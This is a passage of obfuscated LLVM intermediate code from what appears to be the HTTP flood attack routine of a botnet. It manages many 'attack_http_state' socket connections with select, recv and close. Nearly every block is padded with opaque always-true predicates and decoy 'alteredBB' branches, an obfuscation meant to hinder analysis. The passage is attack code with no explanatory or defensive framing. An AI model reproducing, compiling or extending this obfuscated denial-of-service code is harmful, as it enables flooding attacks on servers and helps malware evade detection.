  %1302 = icmp slt i32 %1297, 10
  %1303 = or i1 %1301, %1302
  br i1 %1303, label %originalBBpart2142, label %originalBB126alteredBB

originalBBpart2142:                               ; preds = %originalBB126
  br label %1304

; <label>:1304:                                   ; preds = %originalBBpart2142, %1262
  %1305 = load i32, i32* @x.19
  %1306 = load i32, i32* @y.20
  %1307 = sub i32 %1305, 1
  %1308 = mul i32 %1305, %1307
  %1309 = urem i32 %1308, 2
  %1310 = icmp eq i32 %1309, 0
  %1311 = icmp slt i32 %1306, 10
  %1312 = or i1 %1310, %1311
  br i1 %1312, label %originalBB144, label %originalBB144alteredBB

originalBB144:                                    ; preds = %originalBB144alteredBB, %1304
  %1313 = load i32, i32* @x.19
  %1314 = load i32, i32* @y.20
  %1315 = sub i32 %1313, 1
  %1316 = mul i32 %1313, %1315
  %1317 = urem i32 %1316, 2
  %1318 = icmp eq i32 %1317, 0
  %1319 = icmp slt i32 %1314, 10
  %1320 = or i1 %1318, %1319
  br i1 %1320, label %originalBBpart2146, label %originalBB144alteredBB

originalBBpart2146:                               ; preds = %originalBB144
  br label %1526

; <label>:1321:                                   ; preds = %1256
  %1322 = load i32, i32* @x.19
  %1323 = load i32, i32* @y.20
  %1324 = sub i32 %1322, 1
  %1325 = mul i32 %1322, %1324
  %1326 = urem i32 %1325, 2
  %1327 = icmp eq i32 %1326, 0
  %1328 = icmp slt i32 %1323, 10
  %1329 = or i1 %1327, %1328
  br i1 %1329, label %originalBB148, label %originalBB148alteredBB

originalBB148:                                    ; preds = %originalBB148alteredBB, %1321
  %1330 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1331 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1330, i32 0, i32 1
  %1332 = load i8, i8* %1331, align 4
  %1333 = zext i8 %1332 to i32
  %1334 = icmp eq i32 %1333, 7
  %1335 = load i32, i32* @x.19
  %1336 = load i32, i32* @y.20
  %1337 = sub i32 %1335, 1
  %1338 = mul i32 %1335, %1337
  %1339 = urem i32 %1338, 2
  %1340 = icmp eq i32 %1339, 0
  %1341 = icmp slt i32 %1336, 10
  %1342 = or i1 %1340, %1341
  br i1 %1342, label %originalBBpart2150, label %originalBB148alteredBB

originalBBpart2150:                               ; preds = %originalBB148
  br i1 %1334, label %1343, label %1402

; <label>:1343:                                   ; preds = %originalBBpart2150
  %1344 = load i32, i32* @x.19
  %1345 = load i32, i32* @y.20
  %1346 = sub i32 %1344, 1
  %1347 = mul i32 %1344, %1346
  %1348 = urem i32 %1347, 2
  %1349 = icmp eq i32 %1348, 0
  %1350 = icmp slt i32 %1345, 10
  %1351 = or i1 %1349, %1350
  br i1 %1351, label %originalBB152, label %originalBB152alteredBB

originalBB152:                                    ; preds = %originalBB152alteredBB, %1343
  %1352 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1353 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1352, i32 0, i32 0
  %1354 = load i32, i32* %1353, align 4
  %1355 = srem i32 %1354, 64
  %1356 = zext i32 %1355 to i64
  %1357 = shl i64 1, %1356
  %1358 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %29, i32 0, i32 0
  %1359 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1360 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1359, i32 0, i32 0
  %1361 = load i32, i32* %1360, align 4
  %1362 = sdiv i32 %1361, 64
  %1363 = sext i32 %1362 to i64
  %1364 = getelementptr inbounds [16 x i64], [16 x i64]* %1358, i64 0, i64 %1363
  %1365 = load i64, i64* %1364, align 8
  %1366 = or i64 %1365, %1357
  store i64 %1366, i64* %1364, align 8
  %1367 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1368 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1367, i32 0, i32 0
  %1369 = load i32, i32* %1368, align 4
  %1370 = load i32, i32* %31, align 4
  %1371 = icmp sgt i32 %1369, %1370
  %1372 = load i32, i32* @x.19
  %1373 = load i32, i32* @y.20
  %1374 = sub i32 %1372, 1
  %1375 = mul i32 %1372, %1374
  %1376 = urem i32 %1375, 2
  %1377 = icmp eq i32 %1376, 0
  %1378 = icmp slt i32 %1373, 10
  %1379 = or i1 %1377, %1378
  br i1 %1379, label %originalBBpart2175, label %originalBB152alteredBB

originalBBpart2175:                               ; preds = %originalBB152
  br i1 %1371, label %1380, label %1385

; <label>:1380:                                   ; preds = %originalBBpart2175
  %1381 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1382 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1381, i32 0, i32 0
  %1383 = load i32, i32* %1382, align 4
  %1384 = add nsw i32 %1383, 1
  store i32 %1384, i32* %31, align 4
  br label %1385

; <label>:1385:                                   ; preds = %1380, %originalBBpart2175
  %1386 = load i32, i32* @x.19
  %1387 = load i32, i32* @y.20
  %1388 = sub i32 %1386, 1
  %1389 = mul i32 %1386, %1388
  %1390 = urem i32 %1389, 2
  %1391 = icmp eq i32 %1390, 0
  %1392 = icmp slt i32 %1387, 10
  %1393 = or i1 %1391, %1392
  br i1 %1393, label %originalBB177, label %originalBB177alteredBB

originalBB177:                                    ; preds = %originalBB177alteredBB, %1385
  %1394 = load i32, i32* @x.19
  %1395 = load i32, i32* @y.20
  %1396 = sub i32 %1394, 1
  %1397 = mul i32 %1394, %1396
  %1398 = urem i32 %1397, 2
  %1399 = icmp eq i32 %1398, 0
  %1400 = icmp slt i32 %1395, 10
  %1401 = or i1 %1399, %1400
  br i1 %1401, label %originalBBpart2179, label %originalBB177alteredBB

originalBBpart2179:                               ; preds = %originalBB177
  br label %1509

; <label>:1402:                                   ; preds = %originalBBpart2150
  %1403 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1404 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1403, i32 0, i32 1
  %1405 = load i8, i8* %1404, align 4
  %1406 = zext i8 %1405 to i32
  %1407 = icmp eq i32 %1406, 10
  br i1 %1407, label %1408, label %1451

; <label>:1408:                                   ; preds = %1402
  %1409 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1410 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1409, i32 0, i32 0
  %1411 = load i32, i32* %1410, align 4
  %1412 = srem i32 %1411, 64
  %1413 = zext i32 %1412 to i64
  %1414 = shl i64 1, %1413
  %1415 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %29, i32 0, i32 0
  %1416 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1417 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1416, i32 0, i32 0
  %1418 = load i32, i32* %1417, align 4
  %1419 = sdiv i32 %1418, 64
  %1420 = sext i32 %1419 to i64
  %1421 = getelementptr inbounds [16 x i64], [16 x i64]* %1415, i64 0, i64 %1420
  %1422 = load i64, i64* %1421, align 8
  %1423 = or i64 %1422, %1414
  store i64 %1423, i64* %1421, align 8
  %1424 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1425 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1424, i32 0, i32 0
  %1426 = load i32, i32* %1425, align 4
  %1427 = load i32, i32* %31, align 4
  %1428 = icmp sgt i32 %1426, %1427
  br i1 %1428, label %1429, label %1434

; <label>:1429:                                   ; preds = %1408
  %1430 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1431 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1430, i32 0, i32 0
  %1432 = load i32, i32* %1431, align 4
  %1433 = add nsw i32 %1432, 1
  store i32 %1433, i32* %31, align 4
  br label %1434

; <label>:1434:                                   ; preds = %1429, %1408
  %1435 = load i32, i32* @x.19
  %1436 = load i32, i32* @y.20
  %1437 = sub i32 %1435, 1
  %1438 = mul i32 %1435, %1437
  %1439 = urem i32 %1438, 2
  %1440 = icmp eq i32 %1439, 0
  %1441 = icmp slt i32 %1436, 10
  %1442 = or i1 %1440, %1441
  br i1 %1442, label %originalBB181, label %originalBB181alteredBB

originalBB181:                                    ; preds = %originalBB181alteredBB, %1434
  %1443 = load i32, i32* @x.19
  %1444 = load i32, i32* @y.20
  %1445 = sub i32 %1443, 1
  %1446 = mul i32 %1443, %1445
  %1447 = urem i32 %1446, 2
  %1448 = icmp eq i32 %1447, 0
  %1449 = icmp slt i32 %1444, 10
  %1450 = or i1 %1448, %1449
  br i1 %1450, label %originalBBpart2183, label %originalBB181alteredBB

originalBBpart2183:                               ; preds = %originalBB181
  br label %1492

; <label>:1451:                                   ; preds = %1402
  %1452 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1453 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1452, i32 0, i32 1
  %1454 = load i8, i8* %1453, align 4
  %1455 = zext i8 %1454 to i32
  %1456 = icmp eq i32 %1455, 11
  br i1 %1456, label %1457, label %1482

; <label>:1457:                                   ; preds = %1451
  %1458 = load i32, i32* @x.19
  %1459 = load i32, i32* @y.20
  %1460 = sub i32 %1458, 1
  %1461 = mul i32 %1458, %1460
  %1462 = urem i32 %1461, 2
  %1463 = icmp eq i32 %1462, 0
  %1464 = icmp slt i32 %1459, 10
  %1465 = or i1 %1463, %1464
  br i1 %1465, label %originalBB185, label %originalBB185alteredBB

originalBB185:                                    ; preds = %originalBB185alteredBB, %1457
  %1466 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1467 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1466, i32 0, i32 1
  store i8 0, i8* %1467, align 4
  %1468 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1469 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1468, i32 0, i32 0
  %1470 = load i32, i32* %1469, align 4
  %1471 = call i32 @close(i32 %1470)
  %1472 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1473 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1472, i32 0, i32 0
  store i32 -1, i32* %1473, align 4
  %1474 = load i32, i32* @x.19
  %1475 = load i32, i32* @y.20
  %1476 = sub i32 %1474, 1
  %1477 = mul i32 %1474, %1476
  %1478 = urem i32 %1477, 2
  %1479 = icmp eq i32 %1478, 0
  %1480 = icmp slt i32 %1475, 10
  %1481 = or i1 %1479, %1480
  br i1 %1481, label %originalBBpart2187, label %originalBB185alteredBB

originalBBpart2187:                               ; preds = %originalBB185
  br label %1491

; <label>:1482:                                   ; preds = %1451
  %1483 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1484 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1483, i32 0, i32 1
  store i8 0, i8* %1484, align 4
  %1485 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1486 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1485, i32 0, i32 0
  %1487 = load i32, i32* %1486, align 4
  %1488 = call i32 @close(i32 %1487)
  %1489 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1490 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1489, i32 0, i32 0
  store i32 -1, i32* %1490, align 4
  br label %1491

; <label>:1491:                                   ; preds = %1482, %originalBBpart2187
  br label %1492

; <label>:1492:                                   ; preds = %1491, %originalBBpart2183
  %1493 = load i32, i32* @x.19
  %1494 = load i32, i32* @y.20
  %1495 = sub i32 %1493, 1
  %1496 = mul i32 %1493, %1495
  %1497 = urem i32 %1496, 2
  %1498 = icmp eq i32 %1497, 0
  %1499 = icmp slt i32 %1494, 10
  %1500 = or i1 %1498, %1499
  br i1 %1500, label %originalBB189, label %originalBB189alteredBB

originalBB189:                                    ; preds = %originalBB189alteredBB, %1492
  %1501 = load i32, i32* @x.19
  %1502 = load i32, i32* @y.20
  %1503 = sub i32 %1501, 1
  %1504 = mul i32 %1501, %1503
  %1505 = urem i32 %1504, 2
  %1506 = icmp eq i32 %1505, 0
  %1507 = icmp slt i32 %1502, 10
  %1508 = or i1 %1506, %1507
  br i1 %1508, label %originalBBpart2191, label %originalBB189alteredBB

originalBBpart2191:                               ; preds = %originalBB189
  br label %1509

; <label>:1509:                                   ; preds = %originalBBpart2191, %originalBBpart2179
  %1510 = load i32, i32* @x.19
  %1511 = load i32, i32* @y.20
  %1512 = sub i32 %1510, 1
  %1513 = mul i32 %1510, %1512
  %1514 = urem i32 %1513, 2
  %1515 = icmp eq i32 %1514, 0
  %1516 = icmp slt i32 %1511, 10
  %1517 = or i1 %1515, %1516
  br i1 %1517, label %originalBB193, label %originalBB193alteredBB

originalBB193:                                    ; preds = %originalBB193alteredBB, %1509
  %1518 = load i32, i32* @x.19
  %1519 = load i32, i32* @y.20
  %1520 = sub i32 %1518, 1
  %1521 = mul i32 %1518, %1520
  %1522 = urem i32 %1521, 2
  %1523 = icmp eq i32 %1522, 0
  %1524 = icmp slt i32 %1519, 10
  %1525 = or i1 %1523, %1524
  br i1 %1525, label %originalBBpart2195, label %originalBB193alteredBB

originalBBpart2195:                               ; preds = %originalBB193
  br label %1526

; <label>:1526:                                   ; preds = %originalBBpart2195, %originalBBpart2146
  br label %1527

; <label>:1527:                                   ; preds = %1526, %1255
  %1528 = load i32, i32* @x.19
  %1529 = load i32, i32* @y.20
  %1530 = sub i32 %1528, 1
  %1531 = mul i32 %1528, %1530
  %1532 = urem i32 %1531, 2
  %1533 = icmp eq i32 %1532, 0
  %1534 = icmp slt i32 %1529, 10
  %1535 = or i1 %1533, %1534
  br i1 %1535, label %originalBB197, label %originalBB197alteredBB

originalBB197:                                    ; preds = %originalBB197alteredBB, %1527
  %1536 = load i32, i32* @x.19
  %1537 = load i32, i32* @y.20
  %1538 = sub i32 %1536, 1
  %1539 = mul i32 %1536, %1538
  %1540 = urem i32 %1539, 2
  %1541 = icmp eq i32 %1540, 0
  %1542 = icmp slt i32 %1537, 10
  %1543 = or i1 %1541, %1542
  br i1 %1543, label %originalBBpart2199, label %originalBB197alteredBB

originalBBpart2199:                               ; preds = %originalBB197
  br label %1544

; <label>:1544:                                   ; preds = %originalBBpart2199, %895
  br label %1545

; <label>:1545:                                   ; preds = %1544, %814
  br label %1546

; <label>:1546:                                   ; preds = %1545, %844, %751
  %1547 = load i32, i32* %17, align 4
  %1548 = add nsw i32 %1547, 1
  store i32 %1548, i32* %17, align 4
  br label %639

; <label>:1549:                                   ; preds = %639
  %1550 = load i32, i32* %31, align 4
  %1551 = icmp eq i32 %1550, 0
  br i1 %1551, label %1552, label %1553

; <label>:1552:                                   ; preds = %1549
  br label %600

; <label>:1553:                                   ; preds = %1549
  %1554 = getelementptr inbounds %struct.timeval, %struct.timeval* %33, i32 0, i32 1
  store i64 0, i64* %1554, align 8
  %1555 = getelementptr inbounds %struct.timeval, %struct.timeval* %33, i32 0, i32 0
  store i64 1, i64* %1555, align 8
  %1556 = load i32, i32* %31, align 4
  %1557 = call i32 @select(i32 %1556, %struct.fd_set* %29, %struct.fd_set* %30, %struct.fd_set* null, %struct.timeval* %33)
  store i32 %1557, i32* %32, align 4
  %1558 = call i64 @time(i64* null) #6
  %1559 = trunc i64 %1558 to i32
  store i32 %1559, i32* %35, align 4
  %1560 = load i32, i32* %32, align 4
  %1561 = icmp slt i32 %1560, 1
  br i1 %1561, label %1562, label %1579

; <label>:1562:                                   ; preds = %1553
  %1563 = load i32, i32* @x.19
  %1564 = load i32, i32* @y.20
  %1565 = sub i32 %1563, 1
  %1566 = mul i32 %1563, %1565
  %1567 = urem i32 %1566, 2
  %1568 = icmp eq i32 %1567, 0
  %1569 = icmp slt i32 %1564, 10
  %1570 = or i1 %1568, %1569
  br i1 %1570, label %originalBB201, label %originalBB201alteredBB

originalBB201:                                    ; preds = %originalBB201alteredBB, %1562
  %1571 = load i32, i32* @x.19
  %1572 = load i32, i32* @y.20
  %1573 = sub i32 %1571, 1
  %1574 = mul i32 %1571, %1573
  %1575 = urem i32 %1574, 2
  %1576 = icmp eq i32 %1575, 0
  %1577 = icmp slt i32 %1572, 10
  %1578 = or i1 %1576, %1577
  br i1 %1578, label %originalBBpart2203, label %originalBB201alteredBB

originalBBpart2203:                               ; preds = %originalBB201
  br label %600

; <label>:1579:                                   ; preds = %1553
  %1580 = load i32, i32* @x.19
  %1581 = load i32, i32* @y.20
  %1582 = sub i32 %1580, 1
  %1583 = mul i32 %1580, %1582
  %1584 = urem i32 %1583, 2
  %1585 = icmp eq i32 %1584, 0
  %1586 = icmp slt i32 %1581, 10
  %1587 = or i1 %1585, %1586
  br i1 %1587, label %originalBB205, label %originalBB205alteredBB

originalBB205:                                    ; preds = %originalBB205alteredBB, %1579
  store i32 0, i32* %17, align 4
  %1588 = load i32, i32* @x.19
  %1589 = load i32, i32* @y.20
  %1590 = sub i32 %1588, 1
  %1591 = mul i32 %1588, %1590
  %1592 = urem i32 %1591, 2
  %1593 = icmp eq i32 %1592, 0
  %1594 = icmp slt i32 %1589, 10
  %1595 = or i1 %1593, %1594
  br i1 %1595, label %originalBBpart2207, label %originalBB205alteredBB

originalBBpart2207:                               ; preds = %originalBB205
  br label %1596

; <label>:1596:                                   ; preds = %4291, %originalBBpart2207
  %1597 = load i32, i32* @x.19
  %1598 = load i32, i32* @y.20
  %1599 = sub i32 %1597, 1
  %1600 = mul i32 %1597, %1599
  %1601 = urem i32 %1600, 2
  %1602 = icmp eq i32 %1601, 0
  %1603 = icmp slt i32 %1598, 10
  %1604 = or i1 %1602, %1603
  br i1 %1604, label %originalBB209, label %originalBB209alteredBB

originalBB209:                                    ; preds = %originalBB209alteredBB, %1596
  %1605 = load i32, i32* %17, align 4
  %1606 = load i32, i32* %26, align 4
  %1607 = icmp slt i32 %1605, %1606
  %1608 = load i32, i32* @x.19
  %1609 = load i32, i32* @y.20
  %1610 = sub i32 %1608, 1
  %1611 = mul i32 %1608, %1610
  %1612 = urem i32 %1611, 2
  %1613 = icmp eq i32 %1612, 0
  %1614 = icmp slt i32 %1609, 10
  %1615 = or i1 %1613, %1614
  br i1 %1615, label %originalBBpart2211, label %originalBB209alteredBB

originalBBpart2211:                               ; preds = %originalBB209
  br i1 %1607, label %1616, label %4294

; <label>:1616:                                   ; preds = %originalBBpart2211
  %1617 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %1618 = load i32, i32* %17, align 4
  %1619 = sext i32 %1618 to i64
  %1620 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1617, i64 %1619
  store %struct.attack_http_state* %1620, %struct.attack_http_state** %34, align 8
  %1621 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1622 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1621, i32 0, i32 0
  %1623 = load i32, i32* %1622, align 4
  %1624 = icmp eq i32 %1623, -1
  br i1 %1624, label %1625, label %1626

; <label>:1625:                                   ; preds = %1616
  br label %4291

; <label>:1626:                                   ; preds = %1616
  %1627 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %30, i32 0, i32 0
  %1628 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1629 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1628, i32 0, i32 0
  %1630 = load i32, i32* %1629, align 4
  %1631 = sdiv i32 %1630, 64
  %1632 = sext i32 %1631 to i64
  %1633 = getelementptr inbounds [16 x i64], [16 x i64]* %1627, i64 0, i64 %1632
  %1634 = load i64, i64* %1633, align 8
  %1635 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1636 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1635, i32 0, i32 0
  %1637 = load i32, i32* %1636, align 4
  %1638 = srem i32 %1637, 64
  %1639 = zext i32 %1638 to i64
  %1640 = shl i64 1, %1639
  %1641 = and i64 %1634, %1640
  %1642 = icmp ne i64 %1641, 0
  br i1 %1642, label %1643, label %1731

; <label>:1643:                                   ; preds = %1626
  store i32 0, i32* %43, align 4
  store i32 4, i32* %44, align 4
  %1644 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1645 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1644, i32 0, i32 0
  %1646 = load i32, i32* %1645, align 4
  %1647 = bitcast i32* %43 to i8*
  %1648 = call i32 @getsockopt(i32 %1646, i32 1, i32 4, i8* %1647, i32* %44) #6
  store i32 %1648, i32* %20, align 4
  %1649 = load i32, i32* %43, align 4
  %1650 = icmp eq i32 %1649, 0
  br i1 %1650, label %1651, label %1689

; <label>:1651:                                   ; preds = %1643
  %1652 = load i32, i32* @x.19
  %1653 = load i32, i32* @y.20
  %1654 = sub i32 %1652, 1
  %1655 = mul i32 %1652, %1654
  %1656 = urem i32 %1655, 2
  %1657 = icmp eq i32 %1656, 0
  %1658 = icmp slt i32 %1653, 10
  %1659 = or i1 %1657, %1658
  br i1 %1659, label %originalBB213, label %originalBB213alteredBB

originalBB213:                                    ; preds = %originalBB213alteredBB, %1651
  %1660 = load i32, i32* %20, align 4
  %1661 = icmp eq i32 %1660, 0
  %1662 = load i32, i32* @x.19
  %1663 = load i32, i32* @y.20
  %1664 = sub i32 %1662, 1
  %1665 = mul i32 %1662, %1664
  %1666 = urem i32 %1665, 2
  %1667 = icmp eq i32 %1666, 0
  %1668 = icmp slt i32 %1663, 10
  %1669 = or i1 %1667, %1668
  br i1 %1669, label %originalBBpart2215, label %originalBB213alteredBB

originalBBpart2215:                               ; preds = %originalBB213
  br i1 %1661, label %1670, label %1689

; <label>:1670:                                   ; preds = %originalBBpart2215
  %1671 = load i32, i32* @x.19
  %1672 = load i32, i32* @y.20
  %1673 = sub i32 %1671, 1
  %1674 = mul i32 %1671, %1673
  %1675 = urem i32 %1674, 2
  %1676 = icmp eq i32 %1675, 0
  %1677 = icmp slt i32 %1672, 10
  %1678 = or i1 %1676, %1677
  br i1 %1678, label %originalBB217, label %originalBB217alteredBB

originalBB217:                                    ; preds = %originalBB217alteredBB, %1670
  %1679 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1680 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1679, i32 0, i32 1
  store i8 4, i8* %1680, align 4
  %1681 = load i32, i32* @x.19
  %1682 = load i32, i32* @y.20
  %1683 = sub i32 %1681, 1
  %1684 = mul i32 %1681, %1683
  %1685 = urem i32 %1684, 2
  %1686 = icmp eq i32 %1685, 0
  %1687 = icmp slt i32 %1682, 10
  %1688 = or i1 %1686, %1687
  br i1 %1688, label %originalBBpart2219, label %originalBB217alteredBB

originalBBpart2219:                               ; preds = %originalBB217
  br label %1714

; <label>:1689:                                   ; preds = %originalBBpart2215, %1643
  %1690 = load i32, i32* @x.19
  %1691 = load i32, i32* @y.20
  %1692 = sub i32 %1690, 1
  %1693 = mul i32 %1690, %1692
  %1694 = urem i32 %1693, 2
  %1695 = icmp eq i32 %1694, 0
  %1696 = icmp slt i32 %1691, 10
  %1697 = or i1 %1695, %1696
  br i1 %1697, label %originalBB221, label %originalBB221alteredBB

originalBB221:                                    ; preds = %originalBB221alteredBB, %1689
  %1698 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1699 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1698, i32 0, i32 0
  %1700 = load i32, i32* %1699, align 4
  %1701 = call i32 @close(i32 %1700)
  %1702 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1703 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1702, i32 0, i32 0
  store i32 -1, i32* %1703, align 4
  %1704 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1705 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1704, i32 0, i32 1
  store i8 0, i8* %1705, align 4
  %1706 = load i32, i32* @x.19
  %1707 = load i32, i32* @y.20
  %1708 = sub i32 %1706, 1
  %1709 = mul i32 %1706, %1708
  %1710 = urem i32 %1709, 2
  %1711 = icmp eq i32 %1710, 0
  %1712 = icmp slt i32 %1707, 10
  %1713 = or i1 %1711, %1712
  br i1 %1713, label %originalBBpart2223, label %originalBB221alteredBB

originalBBpart2223:                               ; preds = %originalBB221
  br label %4291

; <label>:1714:                                   ; preds = %originalBBpart2219
  %1715 = load i32, i32* @x.19
  %1716 = load i32, i32* @y.20
  %1717 = sub i32 %1715, 1
  %1718 = mul i32 %1715, %1717
  %1719 = urem i32 %1718, 2
  %1720 = icmp eq i32 %1719, 0
  %1721 = icmp slt i32 %1716, 10
  %1722 = or i1 %1720, %1721
  br i1 %1722, label %originalBB225, label %originalBB225alteredBB

originalBB225:                                    ; preds = %originalBB225alteredBB, %1714
  %1723 = load i32, i32* @x.19
  %1724 = load i32, i32* @y.20
  %1725 = sub i32 %1723, 1
  %1726 = mul i32 %1723, %1725
  %1727 = urem i32 %1726, 2
  %1728 = icmp eq i32 %1727, 0
  %1729 = icmp slt i32 %1724, 10
  %1730 = or i1 %1728, %1729
  br i1 %1730, label %originalBBpart2227, label %originalBB225alteredBB

originalBBpart2227:                               ; preds = %originalBB225
  br label %1731

; <label>:1731:                                   ; preds = %originalBBpart2227, %1626
  %1732 = load i32, i32* @x.19
  %1733 = load i32, i32* @y.20
  %1734 = sub i32 %1732, 1
  %1735 = mul i32 %1732, %1734
  %1736 = urem i32 %1735, 2
  %1737 = icmp eq i32 %1736, 0
  %1738 = icmp slt i32 %1733, 10
  %1739 = or i1 %1737, %1738
  br i1 %1739, label %originalBB229, label %originalBB229alteredBB

originalBB229:                                    ; preds = %originalBB229alteredBB, %1731
  %1740 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %29, i32 0, i32 0
  %1741 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1742 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1741, i32 0, i32 0
  %1743 = load i32, i32* %1742, align 4
  %1744 = sdiv i32 %1743, 64
  %1745 = sext i32 %1744 to i64
  %1746 = getelementptr inbounds [16 x i64], [16 x i64]* %1740, i64 0, i64 %1745
  %1747 = load i64, i64* %1746, align 8
  %1748 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1749 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1748, i32 0, i32 0
  %1750 = load i32, i32* %1749, align 4
  %1751 = srem i32 %1750, 64
  %1752 = zext i32 %1751 to i64
  %1753 = shl i64 1, %1752
  %1754 = and i64 %1747, %1753
  %1755 = icmp ne i64 %1754, 0
  %1756 = load i32, i32* @x.19
  %1757 = load i32, i32* @y.20
  %1758 = sub i32 %1756, 1
  %1759 = mul i32 %1756, %1758
  %1760 = urem i32 %1759, 2
  %1761 = icmp eq i32 %1760, 0
  %1762 = icmp slt i32 %1757, 10
  %1763 = or i1 %1761, %1762
  br i1 %1763, label %originalBBpart2255, label %originalBB229alteredBB

originalBBpart2255:                               ; preds = %originalBB229
  br i1 %1755, label %1764, label %4274

; <label>:1764:                                   ; preds = %originalBBpart2255
  %1765 = load i32, i32* @x.19
  %1766 = load i32, i32* @y.20
  %1767 = sub i32 %1765, 1
  %1768 = mul i32 %1765, %1767
  %1769 = urem i32 %1768, 2
  %1770 = icmp eq i32 %1769, 0
  %1771 = icmp slt i32 %1766, 10
  %1772 = or i1 %1770, %1771
  br i1 %1772, label %originalBB257, label %originalBB257alteredBB

originalBB257:                                    ; preds = %originalBB257alteredBB, %1764
  %1773 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1774 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1773, i32 0, i32 1
  %1775 = load i8, i8* %1774, align 4
  %1776 = zext i8 %1775 to i32
  %1777 = icmp eq i32 %1776, 6
  %1778 = load i32, i32* @x.19
  %1779 = load i32, i32* @y.20
  %1780 = sub i32 %1778, 1
  %1781 = mul i32 %1778, %1780
  %1782 = urem i32 %1781, 2
  %1783 = icmp eq i32 %1782, 0
  %1784 = icmp slt i32 %1779, 10
  %1785 = or i1 %1783, %1784
  br i1 %1785, label %originalBBpart2259, label %originalBB257alteredBB

originalBBpart2259:                               ; preds = %originalBB257
  br i1 %1777, label %1786, label %3565

; <label>:1786:                                   ; preds = %originalBBpart2259
  store i32 0, i32* %45, align 4
  %1787 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  call void @util_zero(i8* %1787, i32 10240)
  %1788 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1789 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1788, i32 0, i32 0
  %1790 = load i32, i32* %1789, align 4
  %1791 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %1792 = call i64 @recv(i32 %1790, i8* %1791, i64 10240, i32 16386)
  %1793 = trunc i64 %1792 to i32
  store i32 %1793, i32* %20, align 4
  %1794 = icmp slt i32 %1793, 1
  br i1 %1794, label %1795, label %1804

; <label>:1795:                                   ; preds = %1786
  %1796 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1797 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1796, i32 0, i32 0
  %1798 = load i32, i32* %1797, align 4
  %1799 = call i32 @close(i32 %1798)
  %1800 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1801 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1800, i32 0, i32 0
  store i32 -1, i32* %1801, align 4
  %1802 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1803 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1802, i32 0, i32 1
  store i8 0, i8* %1803, align 4
  br label %4291

